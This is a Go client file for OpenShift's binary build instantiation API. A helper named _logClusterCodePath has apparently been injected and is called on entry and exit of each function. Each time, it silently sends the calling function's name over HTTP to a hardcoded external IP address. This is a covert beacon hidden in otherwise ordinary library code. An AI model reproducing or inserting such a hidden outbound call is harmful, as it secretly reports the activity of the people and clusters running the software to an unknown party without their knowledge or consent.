package v1

import (
	godefaultbytes "bytes"
	buildv1 "github.com/openshift/api/build/v1"
	"io"
	"k8s.io/client-go/rest"
	"k8s.io/kubernetes/pkg/api/legacyscheme"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type BuildInstantiateBinaryInterface interface {
	InstantiateBinary(name string, options *buildv1.BinaryBuildRequestOptions, r io.Reader) (*buildv1.Build, error)
}

func NewBuildInstantiateBinaryClient(c rest.Interface, ns string) BuildInstantiateBinaryInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &buildInstatiateBinary{client: c, ns: ns}
}

type buildInstatiateBinary struct {
	client rest.Interface
	ns     string
}

func (c *buildInstatiateBinary) InstantiateBinary(name string, options *buildv1.BinaryBuildRequestOptions, r io.Reader) (*buildv1.Build, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := &buildv1.Build{}
	err := c.client.Post().Namespace(c.ns).Resource("buildconfigs").Name(name).SubResource("instantiatebinary").Body(r).VersionedParams(options, legacyscheme.ParameterCodec).Do().Into(result)
	return result, err
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
